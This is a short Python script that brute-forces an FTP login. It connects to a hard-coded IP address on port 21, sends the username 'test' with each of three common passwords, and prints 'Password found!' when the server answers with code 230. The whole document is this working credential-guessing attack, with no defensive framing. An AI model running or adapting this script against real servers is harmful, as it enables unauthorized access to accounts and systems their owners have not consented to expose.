import socket
 
def connect(ip, username, password):
    try:
        s = socket.socket()
        s.connect((ip, 21))
        data = s.recv(1024)
        s.send('USER {}\r\n'.format(username))
        data = s.recv(1024)
        s.send("PASS {}\r\n".format(password))
        data = s.recv(3) # each character in this data is a byte
        s.send("QUIT\r\n")
        s.close()
        return data
    except:
        return
 
username = "test"
ip = "90.130.70.73"
passwords = ["test", "password", "P@ssw0rd"]
 
for p in passwords:
    print("Trying username {} with password {}".format(username, p))
    attempt = connect(ip, username, p)
 
    if attempt == "230":  # 230 means there is a success.
        print("Password found!")